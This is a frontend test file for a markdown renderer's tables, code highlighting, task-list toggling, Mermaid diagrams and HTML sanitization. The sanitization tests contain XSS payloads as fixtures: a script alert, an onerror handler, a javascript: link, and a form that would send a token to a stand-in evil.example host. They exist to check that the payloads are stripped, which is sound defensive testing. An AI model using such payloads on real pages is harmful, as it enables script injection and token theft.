import { describe, it, expect, vi } from 'vitest'
import { render, screen, waitFor, fireEvent } from '@testing-library/react'
import { MarkdownRenderer } from './MarkdownRenderer'
import { MermaidBlock } from './components/MermaidBlock'

const { mockRender } = vi.hoisted(() => ({
  mockRender: vi.fn((_id: string, code: string) => {
    if (code.includes('invalid_syntax')) {
      return Promise.reject(new Error('Syntax error in graph'))
    }
    return Promise.resolve({ svg: `<svg data-testid="mock-mermaid-svg">${code}</svg>` })
  }),
}))

vi.mock('mermaid', () => ({
  default: {
    initialize: vi.fn(),
    render: mockRender,
  },
  initialize: vi.fn(),
  render: mockRender,
}))

describe('MarkdownRenderer — GFM & Syntax Highlighting', () => {
  it('renders GFM tables with header and cells', () => {
    const markdown = `
| Language | Category |
| :--- | :---: |
| Java | OOP |
| TypeScript | Typed JS |
`
    render(<MarkdownRenderer content={markdown} />)

    const table = screen.getByTestId('markdown-table')
    expect(table).toBeInTheDocument()

    expect(screen.getByText('Language')).toBeInTheDocument()
    expect(screen.getByText('Category')).toBeInTheDocument()
    expect(screen.getByText('Java')).toBeInTheDocument()
    expect(screen.getByText('TypeScript')).toBeInTheDocument()
  })

  it('renders syntax highlighted code blocks for Java, TypeScript, Python', () => {
    const markdown = `
\`\`\`java
public class Main {
    public static void main(String[] args) {
        System.out.println("Hello Java");
    }
}
\`\`\`
`
    render(<MarkdownRenderer content={markdown} />)

    const codeBlock = screen.getByTestId('code-block')
    expect(codeBlock).toBeInTheDocument()
    expect(screen.getByText('JAVA')).toBeInTheDocument()
    expect(codeBlock).toHaveTextContent('public class Main')
    // rehype-highlight has to keep running *after* the sanitizer, whose allow-list has no reason to
    // know about `hljs-*` class names — this is what fails if the plugin order is ever swapped.
    expect(codeBlock.querySelector('.hljs-keyword')).not.toBeNull()
  })

  it('highlights a language outside rehype-highlight\'s default "common" subset', () => {
    // toml isn't in lowlight's `common` bundle (rehype-highlight's default) — this only passes
    // because MarkdownRenderer explicitly registers lowlight's `all` grammar set instead.
    const markdown = `
\`\`\`toml
[package]
name = "git-manager"
version = "0.1.0"
\`\`\`
`
    render(<MarkdownRenderer content={markdown} />)

    const codeBlock = screen.getByTestId('code-block')
    expect(screen.getByText('TOML')).toBeInTheDocument()
    expect(codeBlock.querySelector('.hljs-section, .hljs-string')).not.toBeNull()
  })

  it('renders a fenced block with no language tag as a real code block, not inline text', () => {
    // Regression: a plain ``` fence carries no `className` (nothing to highlight, no `language-*`
    // class gets added), and CodeBlock used to read that missing className as "must be inline",
    // ignoring the `inline={false}` MarkdownRenderer had already worked out from the newlines.
    const markdown = `
\`\`\`
meme-swap/
├── apps/
└── packages/
\`\`\`
`
    render(<MarkdownRenderer content={markdown} />)

    expect(screen.getByTestId('code-block')).toBeInTheDocument()
    expect(screen.queryByTestId('inline-code')).not.toBeInTheDocument()
    expect(screen.getByText('TEXT')).toBeInTheDocument()
    expect(screen.getByTestId('code-block')).toHaveTextContent('meme-swap/')
  })

  it('copies the full source of a highlighted block, not just the untokenized fragments', async () => {
    // Regression: `rehype-highlight` rewrites a fenced block's children into `hljs-*` <span>
    // elements, one per token. `codeText` used to stop at the first non-string/non-array child, so
    // the copy button silently dropped every keyword, string literal and identifier it had tokenized.
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })

    const markdown = `
\`\`\`java
public class Main {
    public static void main(String[] args) {
        System.out.println("Hello Java");
    }
}
\`\`\`
`
    render(<MarkdownRenderer content={markdown} />)
    fireEvent.click(screen.getByTestId('code-block-copy-button'))

    expect(writeText).toHaveBeenCalledWith(
      'public class Main {\n' +
        '    public static void main(String[] args) {\n' +
        '        System.out.println("Hello Java");\n' +
        '    }\n' +
        '}'
    )
  })

  it('renders raw HTML tags like div align="center", sub, and img with relative paths', () => {
    const markdown = `
<div align="center">
  <img src="docs/screenshots/app.png" alt="App Logo" width="128" height="128" />
  <sub>Real screenshot</sub>
</div>
`
    render(<MarkdownRenderer content={markdown} repoPath="/Users/me/repo" />)

    const img = screen.getByTestId('markdown-image')
    expect(img).toBeInTheDocument()
    expect(img).toHaveAttribute('alt', 'App Logo')
    expect(img.getAttribute('src')).toContain('/Users/me/repo/docs/screenshots/app.png')

    expect(screen.getByText('Real screenshot')).toBeInTheDocument()
  })
})

/**
 * The renderer is fed PR descriptions, review comments and READMEs written by whoever opened the
 * pull request or published the repository — `rehype-raw` hands all of that straight to the DOM, so
 * these cases pin down what the sanitizer is expected to drop, and what a legitimate README still
 * gets to use.
 */
describe('MarkdownRenderer — sanitization of untrusted HTML', () => {
  it('strips script tags and their contents', () => {
    const { container } = render(
      <MarkdownRenderer content={'<script>alert("xss")</script>Plain text'} />
    )

    expect(container.querySelector('script')).toBeNull()
    expect(container.innerHTML).not.toContain('alert')
    expect(screen.getByText('Plain text')).toBeInTheDocument()
  })

  it('strips forms, which the app CSP does not cover (no form-action directive)', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<form action="https://evil.example/steal"><input name="token" /></form>'}
      />
    )

    expect(container.querySelector('form')).toBeNull()
    expect(container.querySelector('input[name="token"]')).toBeNull()
  })

  it('strips iframes and inline event handlers', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<iframe src="https://evil.example"></iframe><img src="x" onerror="alert(1)" />'}
      />
    )

    expect(container.querySelector('iframe')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
    expect(container.innerHTML).not.toContain('alert(1)')
  })

  it('strips javascript: links but keeps ordinary ones', () => {
    render(
      <MarkdownRenderer
        content={'[bad](javascript:alert(1)) and [good](https://example.com/docs)'}
      />
    )

    const [bad, good] = screen.getAllByTestId('markdown-link')
    expect(bad).not.toHaveAttribute('href')
    expect(good).toHaveAttribute('href', 'https://example.com/docs')
  })

  it('strips style attributes, which can be used to overlay the app UI', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<div style="position:fixed;inset:0;background:#fff">Overlay</div>'}
      />
    )

    expect(container.querySelector('[style*="fixed"]')).toBeNull()
    expect(screen.getByText('Overlay')).toBeInTheDocument()
  })

  it('keeps the raw HTML a README legitimately uses', () => {
    const { container } = render(
      <MarkdownRenderer
        content={
          '<details><summary>More</summary><p>Hidden</p></details>' +
          '<p><kbd>⌘K</kbd> then <b>Enter</b></p>' +
          '<img src="https://example.com/badge.svg" alt="Badge" width="120" />'
        }
      />
    )

    expect(container.querySelector('details')).not.toBeNull()
    expect(screen.getByText('More')).toBeInTheDocument()
    expect(screen.getByText('⌘K')).toBeInTheDocument()
    expect(screen.getByAltText('Badge')).toHaveAttribute('src', 'https://example.com/badge.svg')
    expect(screen.getByAltText('Badge')).toHaveAttribute('width', '120')
  })

  it('keeps GFM column alignment through the sanitizer', () => {
    const markdown = `
| Left | Middle | Right |
| :--- | :----: | ----: |
| a | b | c |
`
    render(<MarkdownRenderer content={markdown} />)

    expect(screen.getByText('Left')).toHaveClass('text-left')
    expect(screen.getByText('Middle')).toHaveClass('text-center')
    expect(screen.getByText('Right')).toHaveClass('text-right')
    expect(screen.getByText('b')).toHaveClass('text-center')
  })

  it('gives headings ids, so a README table of contents has somewhere to link to', () => {
    const { container } = render(<MarkdownRenderer content={'## Getting started\n\ntext'} />)

    // Generated by rehype-slug, from the heading text — the anchor `[…](#getting-started)` expects.
    expect(container.querySelector('#getting-started')).not.toBeNull()
  })

  it('keeps task list checkboxes and their checked state', () => {
    render(<MarkdownRenderer content={'- [x] done\n- [ ] todo'} />)

    const boxes = screen.getAllByRole('checkbox')
    expect(boxes).toHaveLength(2)
    expect(boxes[0]).toBeChecked()
    expect(boxes[1]).not.toBeChecked()
  })
})

/**
 * Ticking a checkbox is a rewrite of the source line it was rendered from, so these pin down the
 * one thing that can silently break: the line a checkbox reports. It travels from remark through
 * `rehype-raw` and the sanitizer on the *list item* — the `input` itself is synthesised and has no
 * position — and a wrong line would tick a different item, or overwrite a line of prose.
 */
describe('MarkdownRenderer — task list toggling', () => {
  it('leaves the checkboxes read-only unless a toggle handler is given', () => {
    render(<MarkdownRenderer content={'- [ ] todo'} />)

    expect(screen.getByRole('checkbox')).toBeDisabled()
  })

  it('rewrites the ticked item, and only that one', () => {
    const onTaskToggle = vi.fn()
    const content = '## Plan\n\n- [ ] first\n- [ ] second\n- [x] third'
    render(<MarkdownRenderer content={content} onTaskToggle={onTaskToggle} />)

    fireEvent.click(screen.getAllByRole('checkbox')[1])

    expect(onTaskToggle).toHaveBeenCalledWith('## Plan\n\n- [ ] first\n- [x] second\n- [x] third')
  })

  it('unticks an item that is checked in the source', () => {
    const onTaskToggle = vi.fn()
    render(<MarkdownRenderer content={'- [x] done'} onTaskToggle={onTaskToggle} />)

    fireEvent.click(screen.getByRole('checkbox'))

    expect(onTaskToggle).toHaveBeenCalledWith('- [ ] done')
  })

  it('toggles a nested item against its own line, not its parent list item', () => {
    const onTaskToggle = vi.fn()
    const content = '- [ ] parent\n  - [ ] child'
    render(<MarkdownRenderer content={content} onTaskToggle={onTaskToggle} />)

    fireEvent.click(screen.getAllByRole('checkbox')[1])

    expect(onTaskToggle).toHaveBeenCalledWith('- [ ] parent\n  - [x] child')
  })

  it('toggles the right item when the list follows prose and loose items', () => {
    const onTaskToggle = vi.fn()
    const content = 'Intro paragraph\n\n- [ ] alpha\n\n- [ ] beta\n\nOutro'
    render(<MarkdownRenderer content={content} onTaskToggle={onTaskToggle} />)

    fireEvent.click(screen.getAllByRole('checkbox')[1])

    expect(onTaskToggle).toHaveBeenCalledWith(
      'Intro paragraph\n\n- [ ] alpha\n\n- [x] beta\n\nOutro'
    )
  })

  it('freezes the checkboxes while a toggle is being saved', () => {
    const onTaskToggle = vi.fn()
    render(
      <MarkdownRenderer content={'- [ ] todo'} onTaskToggle={onTaskToggle} taskTogglePending />
    )

    expect(screen.getByRole('checkbox')).toBeDisabled()
  })
})

describe('MermaidBlock — Diagram rendering & fallback', () => {
  it('renders a valid Mermaid diagram as SVG', async () => {
    const code = 'graph TD;\n  A-->B;'
    render(<MermaidBlock code={code} />)

    await waitFor(() => {
      expect(screen.getByTestId('mock-mermaid-svg')).toBeInTheDocument()
    })
  })

  it('displays error fallback block when Mermaid syntax is invalid', async () => {
    const code = 'graph invalid_syntax'
    render(<MermaidBlock code={code} />)

    await waitFor(() => {
      expect(screen.getByTestId('mermaid-error-fallback')).toBeInTheDocument()
      expect(screen.getByText('Cannot display the Mermaid diagram')).toBeInTheDocument()
    })
  })
})
